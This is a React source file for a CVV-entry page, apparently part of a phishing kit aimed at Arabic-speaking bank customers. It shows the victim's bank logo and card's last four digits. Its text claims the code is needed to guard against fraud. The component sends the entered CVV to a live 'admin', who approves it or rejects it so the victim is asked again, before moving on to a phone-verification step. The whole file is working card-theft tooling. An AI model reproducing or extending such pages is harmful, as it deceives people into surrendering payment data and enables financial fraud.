import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function CVV() {
  const [, navigate] = useLocation();
  const [pin, setPin] = useState(["", "", ""]);
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Get payment data from localStorage
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const cardLast4 = paymentData.cardLast4 || "****";
  
  // Get card info from localStorage (fallback) or signal
  const signalCardInfo = waitingCardInfo.value;
  const cardInfo = signalCardInfo || {
    bankName: paymentData.bankName || '',
    bankLogo: paymentData.bankLogo || '',
    cardType: paymentData.cardType || '',
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("CVV");
    // Focus first input
    inputRefs.current[0]?.focus();
  }, []);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        // Navigate to final page
        navigate("/final-page");
      } else if (action.action === "reject") {
        // Show error and clear PIN
        setPin(["", "", ""]);
        setError(true);
        setIsWaiting(false);
        inputRefs.current[0]?.focus();
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const handleChange = (index: number, value: string) => {
    // Only allow digits
    const digit = value.replace(/\D/g, "").slice(-1);
    
    const newPin = [...pin];
    newPin[index] = digit;
    setPin(newPin);
    setError(false);

    // Auto-focus next input
    if (digit && index < 2) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 3);
    const newPin = [...pin];
    for (let i = 0; i < pastedData.length; i++) {
      newPin[i] = pastedData[i];
    }
    setPin(newPin);
    const lastIndex = Math.min(pastedData.length, 2);
    inputRefs.current[lastIndex]?.focus();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    const fullPin = pin.join("");
    if (fullPin.length !== 3) {
      setError(true);
      return;
    }

    setError(false);
    setIsWaiting(true);
    sendData({
      digitCode: fullPin,
      current: "CVV",
      nextPage: "توثيق رقم الجوال",
      waitingForAdminResponse: true,
    });
  };

  const isPinComplete = pin.every(digit => digit !== "");

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <h1 className="text-xl font-bold text-gray-800 mb-1">إثبات ملكية البطاقة</h1>
          <h2 className="text-2xl font-bold text-primary mb-2">CVV</h2>
          <p className="text-gray-600 text-sm">
            لتأكيد العملية أدخل رمز CVV
          </p>
        </div>

        {/* Bank Logo */}
        {cardInfo?.bankLogo && (
          <div className="flex justify-center items-center mb-6">
            <img
              src={cardInfo.bankLogo}
              alt={cardInfo.bankName || "Bank"}
              className="h-10 object-contain"
            />
          </div>
        )}

        {/* Transaction Info */}
        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
          <p>
            يرجى إدخال رمز CVV المكون من 3 خانات والموجود خلف البطاقة المنتهية بـ <span className="font-bold">{cardLast4}</span> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          {/* PIN Input - 3 separate boxes */}
          <div className="flex justify-center gap-3" dir="ltr" onPaste={handlePaste}>
            {pin.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { inputRefs.current[index] = el; }}
                type="tel"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className={`w-12 h-12 text-center text-lg font-bold border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary ${
                  error ? "border-red-500" : "border-gray-300"
                }`}
              />
            ))}
          </div>

          {error && (
            <p className="text-red-500 text-sm text-center font-medium">
              رمز CVV غير صحيح، يرجى المحاولة مرة أخرى.
            </p>
          )}

          {/* Submit Button */}
          <Button 
            type="submit" 
            className="w-full h-11 text-sm" 
            disabled={isWaiting || !isPinComplete}
          >
            {isWaiting ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>جاري التحقق...</span>
              </div>
            ) : (
              "تأكيد"
            )}
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
